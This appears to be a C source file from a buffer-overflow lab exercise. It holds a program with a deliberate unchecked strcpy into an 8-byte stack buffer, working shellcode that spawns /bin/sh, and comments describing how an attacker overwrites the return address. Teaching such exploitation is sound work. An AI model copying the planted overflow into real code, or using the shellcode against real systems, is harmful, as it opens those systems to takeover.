/* stackX.c */

/* This program has a buffer overflow vulnerability. */
/* Our task is to exploit this vulnerability */
/* Attacker first run exploitX.c to generate a bad input file */
/* named badshellcodefile, which overflows the buffer to overwrite */
/* return address with the address of shellcode. */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[]=
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdq                            */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
;

int bof(char *str)
{
    char buffer[8];
    printf("&shellcode=%p\n", &shellcode);
    printf("&buffer=%p\n", &buffer);
    /* The following statement has a buffer overflow problem */ 
    strcpy(buffer, str);

    return 1;
}

int main(int argc, char **argv)
{
    char str[41];
    FILE *badfile;

    badfile = fopen("badshellcodefile", "r");
    fread(str, sizeof(char), 40, badfile);
    str[40] = '\0';
    bof(str);

    printf("Returned Properly\n");
    return 1;
}
